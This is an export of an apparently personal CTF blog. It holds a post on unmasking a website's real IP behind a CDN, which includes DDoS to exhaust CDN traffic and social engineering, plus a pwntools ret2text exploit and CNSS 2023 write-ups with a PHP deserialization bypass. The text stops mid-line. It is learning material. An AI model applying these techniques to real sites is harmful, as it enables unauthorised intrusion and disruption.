{"pages":[{"title":"about","text":"是个笨蛋，喜欢ctf，多多指教呀","link":"/about/index.html"},{"title":"links","text":"友链好耶！快来加友链 lazy: https://lazy.ink/","link":"/links/index.html"}],"posts":[{"title":"cdn绕过大全tips思路","text":"[toc] cdn绕过技巧tipscdn判断方式: 超级ping多地ping1配置不安全 | 超级ping&amp;多地ping&amp;冷门地区国家ping以阿里云cdn为例子，在配置cdn的面板上有这几个选项 在加速区域中，有全部加速区域，仅中国内地，全球（不包括中国内地） 一般搞运维的人员在配置各种服务的时候，都会根据实际需求来配置，因为额外的可能要钱，可能其他cdn厂商加速的地区越多收的钱越多，比如说公司业务范围只在国内的会配置仅中国内地，业务在国外的可能会配置 全球(不包含中国内地)，当然这个不是非常绝对的，只是大多数情况下。 这时候只要使用全球ping超级ping之类的，国外发起在请求就能很简单绕过 如果配置了全部加速区域的话，这时候需要从冷门的地区下手，像一些网络不发达的地区比如非洲啊之类的，大概率情况下厂商都不会在这些地方配置节点。 12345涉及资源: 资源具有时效性，搜索关键词: 超级ping&amp;网站测速&amp;在线ping&amp;全球ping 等等https://www.17ce.com/ 超级pinghttps://www.itdog.cn/ping/ 全球pinghttps://tools.ipip.net/cdn.php 国外请求 2配置不安全 | 域名配置上以阿里云cdn为例子 可能情况 站点test.com 运维人员在上面配置了www.test.com，那这时候cdn只会加速www.test.com，这时候直接请求test.com不会加速，可以直接访问test.com绕过, 如果子域名比如说a.test.com也是解析到同一台服务器上面的，子域名没有被加速访问子域名也可以绕过。 tips多个域名解析到同一台机器上可能会有几种情况： 1公司穷或者是业务不太大一台服务器刚刚好够用 2正向代理的情况，服务器都放在内网里面，然后做了内网穿透。 3 ddos绕过 | 优先级很低一般cdn都是按流量付费的，只要ddos把他流量打完，那cdn就没了 4 利用服务器主动请求 | 邮件服务&amp;ssrf漏洞利用服务器主动请求，一般在注册账号支持用邮箱注册，邮件服务一般都在同一台机器上，这时候利用网站发来的验证信息来判断网站真实ip，在修改密码，找回账号之类的功能点也可以。 如果网站本身存在ssrf漏洞，也可以利用ssrf来绕过，在vps上开个nc监听，这时候请求vps也能找到真实地址 5 社工 |优先级较低如果能社工到cdn平台的账号和密码，那就很简单了，不过都既然能社工到这个了，那为什么不把方向转到社工服务器终端服务账号密码上面hh 6 dns历史可能会存在一种情况，服务器前期没有配置cdn加速，后面才配置了cdn服务，这时候可以利用dns解析历史记录来绕过 12https://www.webscan.cc/http://tools.bugscaner.com/historydns.html 7备案信息可以通过查询网站备案信息来获取所在地之类的，会有些许帮助 8信息泄露_遗留文件像phpinfo 探针之类的信息泄露和前期运维的遗留文件都会暴露真实ip，通过目录扫描来查找这些文件。 9万能方法，扫全网123相关资源https://github.com/boy-hack/w8fuckcdnhttps://github.com/Tai7sy/fuckcdn","link":"/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/"},{"title":"exp本地不通远程通的问题","text":"今天看一个ret2text的题目的时候，遇到了exp本地不通，远程通的奇怪问题，题目是这样的 有个backdoor函数是这样的 exp是这样的 123456789101112131415from pwn import *# p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)elf = context.binary = ELF('./Intruduce')p = process()context.log_level='debug'payload=b'a'* (32 + 8)backd00r=0x4011B6payload+=p64(backd00r)s=p.recvline() ; print(s)print(s)char=p.recv(1)print(char)p.sendline(payload)p.interactive() gdb调试了一下发现在call system的时候卡在了这个xmm寄存器里 搜索了一下，在这里找到了解决方法 https://blog.csdn.net/fjh1997/article/details/107695261 发现是glibc &gt;= 2.27的时候 system函数里面会调用xmm寄存器，xmm寄存器要求16字节对齐，远程的环境应该是&lt;2.27的所以可以直接打通，然后我本地的glibc版本是2.35的，所以会因为xmm寄存器内存对齐的原因导致exp打不通，只需要少push一个地址，内存就对齐了 一开始我是用4011B6这个地址，后面换成了4011BB就对齐了，然后本地就通了 1234567891011121314from pwn import *# p=remote(&quot;1.container.jingsai.apicon.cn&quot;,30509)elf = context.binary = ELF('./Intruduce')p = process()context.log_level='debug'payload=b'a'* (32 + 8)backd00r=0x4011BB # old address 4011B6payload+=p64(backd00r)s=p.recvline() ; print(s)print(s)char=p.recv(1)print(char)p.sendline(payload)p.interactive()","link":"/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/"},{"title":"cnss2023","text":"Web[Baby] SignIn查看源代码，script.js文件中有一段document.getElementById(‘flag’).addEventListener(‘click’, function()下面是一段jsfuck混淆 https://enkhee-osiris.github.io/Decoder-JSFuck/ 得到flag [Baby] Backdoorpost传system()执行系统命令，找到flag [Baby] Webpackhttps://www.cnblogs.com/guowenrui/p/17023732.html 参考的这个文章 安装nodejs 用reverse-sourcemap .map文件还原找到flag [Easy] Leak.swp备份文件 vim -r还原得到flag [Easy] ezhttp传参的时候有些问题，像传host还有referer，可能是我这边安装的burp有问题，上网上查了一下发现curl也能传很多参数 1curl -X CNSS -A &quot;Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4313 MMWEBSDK/20220604 Mobile Safari/537.36 MMWEBID/8603 MicroMessenger/8.0.24.2180(0x28001851) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64&quot; -H &quot;Referer: cnss.io&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -H &quot;Host: uestc.edu.cn&quot; -H &quot;Content-Type: application/json&quot; -d &quot;{\\&quot;name\\&quot;: \\&quot;nyyyddddn\\&quot;,\\&quot;password\\&quot; : \\&quot;123456\\&quot;}&quot; -b &quot;name=nyyyddddn;password=123456&quot; -u nyyyddddn:123456 http://124.221.34.13:50005/Index [Easy] ezunserializefssmsl网页那显示错误是unicode里面的LRI PDI RLO的原因，在ide里面没有这种问题，传参的时候转url编码传就行了，只需要改对象数量绕过__wakeup就拿到flag了 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);show_source(__FILE__);include &quot;flag.php&quot;;class CNSS{ public $username = 'admin'; private $i_want2_say = '‮⁦fssmsl⁩⁦i_like_web'; protected $password = 'ctf'; function __wakeup() { $this-&gt;username = 'guest'; $this-&gt;i_want2_say = 'i_like_web'; $this-&gt;password = '123456'; echo &quot;&lt;br/&gt; wake up! &lt;br/&gt;&quot;; } function __destruct() { echo &quot;destruct&lt;br /&gt;&quot;; if ($this-&gt;username === 'admin' &amp;&amp; $this-&gt;password === 'ctf' &amp;&amp; $this-&gt;i_want2_say === '‮⁦fssmsl⁩⁦i_like_web') { //wtf global $flag; echo $flag; } else echo &quot;you are 2 baby la&lt;br/&gt;&quot;; }}$aa = new CNSS();$ss = serialize($aa);$ss=str_replace('&quot;CNSS&quot;:3','&quot;CNSS&quot;:4',$ss);echo urlencode($ss); Re[Baby] Welcome to Reverse World!main函数那，一打开就有flag了 123456789101112131415161718192021222324252627; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearStr= byte ptr -40hpush rbpmov rbp, rspsub rsp, 60hcall __mainlea rax, [rbp+Str]mov rdx, raxlea rcx, Format ; &quot;%s&quot;call scanflea rax, [rbp+Str]mov rcx, rax ; Strcall strlenmov rdx, raxlea rax, [rbp+Str]mov r8, rdx ; Sizelea rdx, flag ; &quot;cnss{1t_s3ems_l1ke_Y0u_c4n_us3_IDA_n0w!&quot;...mov rcx, rax ; Buf1call memcmptest eax, eaxjnz short loc_401587 [Baby] Find me1234567891011121314151617181920212223; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearpush rbpmov rbp, rspsub rsp, 20hcall __mainlea rcx, aOopsWhereIsMyF ; &quot;Oops! Where is my flag?&quot;call putslea rcx, aLearnAboutStri ; &quot;Learn about Strings and you can see the&quot;...call putslea rcx, aLearnAboutFunc ; &quot;Learn about Functions and you can see t&quot;...call putslea rcx, aLearnAboutXref ; &quot;Learn about Xref and you can see the th&quot;...call putslea rcx, aTheLastPartIsI ; &quot;The last part is _ID4_N0w!}&quot;call putsadd rsp, 20hpop rbpretnmain endp 根据提示，搜字符串cnss{ ，alt+t匹配大小写，找到第一部分cnss{W0w!Y0u’,0 查找函数，发现第二部分是函数名_Comp1et3ly_Uns7and_ 交叉引用puts找到第三部分 123456789101112131415161718192021222324252627282930313233; Attributes: bp-based framepublic sub736sub736 proc nearpush rbpmov rbp, rspsub rsp, 20hmov ecx, 68h ; 'h' ; Charactercall putcharmov ecx, 30h ; '0' ; Charactercall putcharmov ecx, 77h ; 'w' ; Charactercall putcharmov ecx, 5Fh ; '_' ; Charactercall putcharmov ecx, 74h ; 't' ; Charactercall putcharmov ecx, 30h ; '0' ; Charactercall putcharmov ecx, 5Fh ; '_' ; Charactercall putcharmov ecx, 75h ; 'u' ; Charactercall putcharmov ecx, 73h ; 's' ; Charactercall putcharmov ecx, 33h ; '3' ; Charactercall putcharlea rcx, Buffer ; &quot;Find out which function refer to me!&quot;call putsmov eax, 1BF52hadd rsp, 20hpop rbpretn 拼接获得flag cnss{W0w!Y0u_Comp1et3ly_Uns7and_h0w_t0_us3_ID4_N0w!} [Easy] 回レ! 雪月花1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [rsp+Ch] [rbp-34h] int j; // [rsp+Ch] [rbp-34h] int k; // [rsp+Ch] [rbp-34h] char v7[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); puts(&quot;Please input your flag:&quot;); __isoc99_scanf(&quot;%s&quot;, v7); for ( i = 0; i &lt;= 31; ++i ) v7[i] ^= 0x11u; for ( j = 0; j &lt;= 28; ++j ) encode(&amp;v7[j], &amp;v7[j + 1], &amp;v7[j + 2], &amp;v7[j + 3]); for ( k = 0; k &lt;= 31 &amp;&amp; v7[k] == cipher[k]; ++k ) ; if ( k == 32 ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); return 0;} 这种逆向题倒过来看会很直观，分三层，把输入的字符串异或上0x11u，然后encode一遍，和cipher判断，一致获得flag 12345678910111213141516171819_BYTE *__fastcall encode(_BYTE *a1, _BYTE *a2, _BYTE *a3, _BYTE *a4){ _BYTE *result; // rax char v5; // [rsp+2Ch] [rbp-4h] char v6; // [rsp+2Dh] [rbp-3h] char v7; // [rsp+2Eh] [rbp-2h] char v8; // [rsp+2Fh] [rbp-1h] v5 = (*a1 &lt;&lt; 7) | (*a2 &gt;&gt; 1); v6 = ((*a4 &gt;&gt; 2) | (*a3 &lt;&lt; 6)) ^ v5; v7 = ((*a1 &gt;&gt; 1) | (*a2 &lt;&lt; 7)) ^ v6; v8 = ((*a3 &gt;&gt; 2) | (*a4 &lt;&lt; 6)) ^ v7; *a1 = v5; *a2 = v6; *a3 = v7; result = a4; *a4 = v8; return result;} 看了半天了不太会，去掉异或之后其他的不知道怎么做了 搜了一下发现这好像是往年题，做法是把异或去掉后，根据a1 a2 a3 a4的顺序倒着做一遍就好了 123456789101112131415161718192021222324252627#include &lt;cstdio&gt;int c[] = { 63,143,163,188,141,39,122,103,226,3,162,224, 172,234,149,139,163,237,204,182,50,140,148,82, 130,138,20,198,245,174,104,115,0};int main(){ for (int i = 28; i &gt;= 0; i--) { c[i + 3] ^= c[i + 2]; c[i + 2] ^= c[i + 1]; c[i + 1] ^= c[i + 0]; int p[4]; p[0] = ((c[i + 2] &amp; 127) &lt;&lt; 1) | (c[i] &gt;&gt; 7); p[1] = ((c[i] &amp; 127) &lt;&lt; 1) | (c[i + 2] &gt;&gt; 7); p[2] = ((c[i + 3] &amp; 63) &lt;&lt; 2) | (c[i + 1] &gt;&gt; 6); p[3] = ((c[i + 1] &amp; 63) &lt;&lt; 2) | (c[i + 3] &gt;&gt; 6); for (int j = 0; j &lt; 4; j++) c[i + j] = p[j]; } for (int i = 0; i &lt; 32; i++) putchar(c[i] ^ 17); puts(&quot;&quot;); return 0;} [Easy] 邪王真眼encode 3和4 然后还有一个alpha的索引表，应该是base64 然后替换了索引表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253__int64 __fastcall encode(char *a1, int a2, _BYTE *a3, int *a4){ int v5; // esi int v6; // esi int v7; // esi int v8; // [rsp+30h] [rbp-20h] int v9; // [rsp+34h] [rbp-1Ch] int i; // [rsp+3Ch] [rbp-14h] int v12; // [rsp+4Ch] [rbp-4h] char *v13; // [rsp+70h] [rbp+20h] v13 = a1; if ( !a1 || !a2 ) return 0xFFFFFFFFi64; v12 = 0; if ( a2 % 3 ) v12 = 3 - a2 % 3; v9 = a2 + v12; v8 = 8 * (a2 + v12) / 6; for ( i = 0; i &lt; v9; i += 3 ) { *a3 = alpha[*v13 &gt;&gt; 2]; if ( a2 + v12 - 3 == i &amp;&amp; v12 ) { if ( v12 == 1 ) { v5 = (char)cmove_bits((unsigned __int8)*v13, 6i64, 2i64); a3[1] = alpha[v5 + (char)cmove_bits((unsigned __int8)v13[1], 0i64, 4i64)]; a3[2] = alpha[(char)cmove_bits((unsigned __int8)v13[1], 4i64, 2i64)]; a3[3] = 61; } else if ( v12 == 2 ) { a3[1] = alpha[(char)cmove_bits((unsigned __int8)*v13, 6i64, 2i64)]; a3[2] = 61; a3[3] = 61; } } else { v6 = (char)cmove_bits((unsigned __int8)*v13, 6i64, 2i64); a3[1] = alpha[v6 + (char)cmove_bits((unsigned __int8)v13[1], 0i64, 4i64)]; v7 = (char)cmove_bits((unsigned __int8)v13[1], 4i64, 2i64); a3[2] = alpha[v7 + (char)cmove_bits((unsigned __int8)v13[2], 0i64, 6i64)]; a3[3] = alpha[v13[2] &amp; 0x3F]; } a3 += 4; v13 += 3; } if ( a4 ) *a4 = v8; return 0i64;} 用这个网站http://web.chacuo.net/netbasex把alpha索引表加上去，解密UR3oWS5E0G03tRibWRrR0cEx拿到flag [Mid] 恭喜你获得了flag提现机会！ida中patch program修改然后直接call outputflag就拿到flag了 [Mid] Pyfuck12345678910x = [~((((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~(((((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~(((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~(((~((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))]flag = input(&quot;flag: &quot;)if len(flag) == 31: for i in range(len(flag)): if (ord(flag[i])^((~((~(((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))!=x[i]: print(&quot;Wrong&quot;) exit() print(&quot;Correct&quot;)else: print(&quot;Wrong&quot;) 这个挺有意思的[]&lt;[]产生一个0然后用各种位运算。只需要x[]异或上if判断中的 (((((((-([]&lt;[]))&lt;&lt;(-([]&lt;[]))))&lt;&lt;(-([]&lt;[]))))&lt;&lt;(-([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))然后chr输出就拿到flag了 [Mid] diannaobaozhale123456789101112131415161718192021222324252627282930313233343536373839404142434445main proc nearvar_5 = byte ptr -5var_4 = dword ptr -4; __unwind { endbr64 push rbp mov rbp, rsp sub rsp, 10h mov [rbp+var_5], 63 mov edi, 63h call _putchar mov edi, 6Eh call _putchar mov edi, 73h call _putchar mov edi, 73h call _putchar mov edi, 7Bh call _putchar mov [rbp+var_4], 0 jmp short loc_11B0; ---------------------------------------------------------------------------loc_1194: movsx eax, [rbp+var_5] mov edi, eax ; call _putchar movzx eax, [rbp+var_5] add eax, 2 xor eax, 1 mov [rbp+var_5], al add [rbp+var_4], 1loc_11B0: cmp [rbp+var_4], 9 jle short loc_1194 mov edi, 7Dh call _putchar mov eax, 0 leave retn; }main endp __putchar输出字符 63h 6Eh 73h 73h 7Bh 对应cnss{ cmp [rbp+var_4], 9 jle short loc_1194以及add [rbp+var_4], 1 就是一个九次的循环 7Dh对应 } 12345678910111213141516171819#include &lt;cstdio&gt;int main(){ putchar('c'); putchar('n'); putchar('s'); putchar('s'); putchar('{'); char rbpvar5 = 'c'; for (int i = 0; i &lt;= 9; i++) { putchar(rbpvar5); rbpvar5 += 2; rbpvar5 ^= 1; } putchar('}'); putchar('\\n'); return 0;} 拿到flag cnss{cdghklopst} [Hard] Shino 的心跳大冒险玩了一下发现flag被挡住了，看目录里面有好几个Yuri关键词，搜索了一下发现 https://github.com/rinkako/YuriAVGEngine这个项目 看了下简洁这个游戏引擎是基于虚拟机的，有个main.sil是存放游戏逻辑的中间码的，但是被加密了，像是base64加密，用在线的base64解密发现乱码 继续翻项目，发现有个yuriricli是用来编译项目的，下载源码看看里面是怎么加密的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778using System.Text;namespace Yuri.YuriInterpreter{ /// &lt;summary&gt; /// 加密解密类 /// &lt;/summary&gt; public static class YuriEncryptor { /// &lt;summary&gt; /// 对一个字符串做DES加密 /// &lt;/summary&gt; /// &lt;param name=&quot;data&quot;&gt;要加密的数据&lt;/param&gt; /// &lt;param name=&quot;key&quot;&gt;私钥&lt;/param&gt; /// &lt;returns&gt;加密完毕的字符串&lt;/returns&gt; public static string EncryptString(string data, string key) { string str = string.Empty; if (string.IsNullOrEmpty(data)) { return str; } MemoryStream ms = new MemoryStream(); byte[] myKey = Encoding.UTF8.GetBytes(key); byte[] myIV = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; DES myProvider = new DESCryptoServiceProvider(); CryptoStream cs = new CryptoStream(ms, myProvider.CreateEncryptor(myKey, myIV), CryptoStreamMode.Write); try { byte[] bs = Encoding.UTF8.GetBytes(data); cs.Write(bs, 0, bs.Length); cs.FlushFinalBlock(); str = Convert.ToBase64String(ms.ToArray()); } finally { cs.Close(); ms.Close(); } return str; } /// &lt;summary&gt; /// 对一个字符串做DES解密 /// &lt;/summary&gt; /// &lt;param name=&quot;data&quot;&gt;要解密的数据&lt;/param&gt; /// &lt;param name=&quot;key&quot;&gt;私钥&lt;/param&gt; /// &lt;returns&gt;解密完毕的字符串&lt;/returns&gt; public static string DecryptString(string data, string key) { string str = string.Empty; if (string.IsNullOrEmpty(data)) { throw new Exception(&quot;data is empty&quot;); } MemoryStream ms = new MemoryStream(); byte[] myKey = Encoding.UTF8.GetBytes(key); byte[] myIV = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; DES myProvider = new DESCryptoServiceProvider(); CryptoStream cs = new CryptoStream(ms, myProvider.CreateDecryptor(myKey, myIV), CryptoStreamMode.Write); try { byte[] bs = Convert.FromBase64String(data); cs.Write(bs, 0, bs.Length); cs.FlushFinalBlock(); str = Encoding.UTF8.GetString(ms.ToArray()); } finally { cs.Close(); ms.Close(); } return str; } }} 这个是des加密的，下面还有解密函数，就在窗口load那调用了一下 1234567891011private void CPMainForm_Load(object sender, EventArgs e){ String path = &quot;D:\\\\dw_file\\\\cnss\\\\CNSS Rev Challenge\\\\Scenario\\\\main.sil&quot;; foreach (string encryptedData in File.ReadLines(path)) { string key = &quot;yurayuri&quot;; string decryptedData = YuriEncryptor.DecryptString(encryptedData, key); Console.WriteLine(decryptedData); } } 解密出来的文本是这样的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495main_0@NOP^^^^main_0@act_bgm#main_1@act_bg#main_2@act_se#main_4@act_dialog#main_6@act_cstand#main_7@act_se#main_9@act_dialog#main_11@act_deletecstand#main_12@act_se#main_14@act_dialog#main_16@act_se#main_18@act_dialog#main_20@act_stopbgm#main_21@act_cstand#main_22@act_se#main_24@act_dialog#main_26@act_bgm#main_27@act_se#main_29@act_dialog#main_31@act_se#main_33@act_dialog#main_35@act_se#main_37@act_dialog#main_39@act_deletecstand#main_40@act_bg#main_41@act_se#main_43@act_dialog#main_45@act_se#main_47@act_dialog#main_49@act_se#main_51@act_dialog#main_53@act_se#main_55@act_dialog#main_57@act_se#main_59@act_dialog#main_61@act_se#main_63@act_dialog#main_65@act_se#main_66@act_bg#main_67@act_wait#main_68@act_bg#main_69@act_cstand#main_71@act_dialog#main_73@act_deletecstand#main_74@act_se#main_75@act_bg#main_76@act_wait#main_77@act_se#main_78@act_bg#main_79@act_wait#main_80@act_bg#main_81@act_stopbgm#main_82@act_cstand#main_83@act_se#main_85@act_dialog#main_87@act_bg#main_88@act_bgm#main_89@act_deletecstand#main_90@act_cstand#main_91@act_se#main_93@act_dialog#main_95@act_se#main_97@act_dialog#main_99@act_se#main_101@act_dialog#main_103@act_se#main_105@act_dialog#main_107@act_se#main_109@act_dialog#main_111@a